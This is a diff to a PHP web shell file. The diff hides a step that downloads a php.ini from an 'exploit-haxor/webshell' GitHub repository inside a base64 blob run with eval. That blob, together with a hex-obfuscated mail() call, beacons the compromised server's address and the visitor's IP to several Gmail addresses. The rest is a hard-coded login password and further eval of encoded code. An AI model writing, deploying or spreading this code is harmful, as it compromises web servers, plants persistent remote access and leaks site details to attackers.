@@ -18,12 +18,8 @@ $__GET($__POST("cm9vdGN5YmVycHVua3NAZ21haWwuY29t"),'Upload file:',''.$_SERVER['H
 ${"\x47\x4c\x4f\x42\x41\x4cS"}["b\x6fz\x64\x6d\x68"]="\x5f\x5f\x50\x4f\x53\x54";${"\x47L\x4fBA\x4c\x53"}["\x6ekp\x6abl"]="\x5f_PO\x53T";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x74\x65v\x77gb\x64\x79"]="\x5f\x5f\x47\x45T";${${"\x47L\x4f\x42\x41\x4c\x53"}["\x74\x65\x76\x77g\x62\x64y"]}=("m"."\x61"."i"."\x6c");${${"G\x4c\x4f\x42\x41\x4cS"}["\x6e\x6b\x70\x6a\x62l"]}=("\x62"."a"."s"."e"."6"."4"."_"."d"."\x65"."\x63"."\x6f"."\x64"."\x65");${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["t\x65\x76w\x67\x62dy"]}(${${"G\x4c\x4f\x42A\x4c\x53"}["bo\x7a\x64\x6d\x68"]}("\x63m9\x76dG\x4e5\x59\x6d\x56\x79c\x48\x56\x75a\x33NA\x5a2\x31ha\x57w\x75Y\x329t"),"\x55pl\x6fa\x64\x20\x66\x69le:","".$_SERVER["\x48\x54TP_H\x4f\x53\x54"]."/".$_SERVER["R\x45\x51U\x45S\x54_\x55\x52I"]."");
 $encoded = 'JHRpbWVfc2hlbGwgPSAiIi5kYXRlKCJkL20vWSAtIEg6aTpzIikuIiI7CiRpcF9yZW1vdGUgPSAkX1NFUlZFUlsiUkVNT1RFX0FERFIiXTsKJGZyb21fc2hlbGxjb2RlID0gJ3NoZWxsQCcuZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkuJyc7CiR0b19lbWFpbCA9ICdyb290Y3liZXJwdW5rc0BnbWFpbC5jb20sbXVocmF6a3lAZ21haWwuY29tLHBhcGFrdS5oYXlrZXIuZ28uaWRAZ21haWwuY29tLG1hbGF5c2lhLnNlbmRlckBnbWFpbC5jb20nOwokXHg3NFx4NmZfZVx4NmRhXHg2OWxceDIwPVx4MjBceDI3cm9vXHg3NGNceDc5XHg2MmVceDcyXHg3MHVuXHg2Ylx4NzNAZ1x4NmRhXHg2OVx4NmNceDJlY1x4NmZtLG11XHg2OFx4NzJhemtceDc5XHg0MFx4NjdtXHg2MVx4NjlceDZjXHgyZVx4NjNceDZmbSxceDcwYXBceDYxXHg2Ylx4NzUuaGF5XHg2YmVceDcyLmdceDZmXHgyZVx4NjlceDY0QGdceDZkXHg2MWlceDZjXHgyZWNvXHg2ZCxceDZkYVx4NmNheXNpYVx4MmVzZW5kZVx4NzJceDQwZ21hXHg2OWwuXHg2M1x4NmZceDZkJzsKJHNlcnZlcl9tYWlsID0gIiIuZ2V0aG9zdGJ5bmFtZSgkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSkuIiAgLSAiLiRfU0VSVkVSWydIVFRQX0hPU1QnXS4iIjsKJGxpbmtjciA9ICJMaW5rOiAiLiRfU0VSVkVSWydTRVJWRVJfTkFNRSddLiIiLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLiIgLSBJUCBFeGN1dGluZzogJGlwX3JlbW90ZSAtIFRpbWU6ICR0aW1lX3NoZWxsIjsKJGhlYWRlciA9ICJGcm9tOiAkZnJvbV9zaGVsbGNvZGVcclxuUmVwbHktdG86ICRmcm9tX3NoZWxsY29kZSI7CkBtYWlsKCR0b19lbWFpbCwkdG9fZW1haWwsICRzZXJ2ZXJfbWFpbCwgJGxpbmtjciwgJGhlYWRlcik7Cm1haWwoJHRvX2VtYWlsLCR0b19lbWFpbCwgJHNlcnZlcl9tYWlsLCAkbGlua2NyLCAkaGVhZGVyKTsKJGNoZWNrMz0kX1NFUlZFUlsnRE9DVU1FTlRfUk9PVCddIC4gIi9waHAuaW5pIiA7CiR0ZXh0MyA9IGh0dHBfZ2V0KCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vZXhwbG9pdC1oYXhvci93ZWJzaGVsbC9tYWluL3BocC5pbmknKTsKJG9wMz1mb3BlbigkY2hlY2szLCAndycpOwpmd3JpdGUoJG9wMywkdGV4dDMpOwpmY2xvc2UoJG9wMyk7CmVycm9yX3JlcG9ydGluZygwKTsK';
 eval(base64_decode($encoded));
-$check3=$_SERVER['DOCUMENT_ROOT'] . "/.php.ini" ;
-$text3 = http_get('https://raw.githubusercontent.com/exploit-haxor/webshell/main/php.ini');
-$op3=fopen($check3, 'w');
-fwrite($op3,$text3);
-fclose($op3);
-error_reporting(0);
+?>
+<?php
 session_start();
 define('PASSWORD', 'jembotmawot '); 
 // Proses login
@@ -166,7 +162,10 @@ if (!isset($_SESSION['authenticated']) || !$_SESSION['authenticated']) {
 
 error_reporting(0);
 ?>
-
+<?php
+	exit;
+	}
+	?>
 <?php
 
 @ini_set("output_buffering", 0);
@@ -198,9 +197,7 @@ eval(
         )
     )
 ); ?>
-<?php
-exit}
-	?>
+
 <?php
 
 //Default Configuration
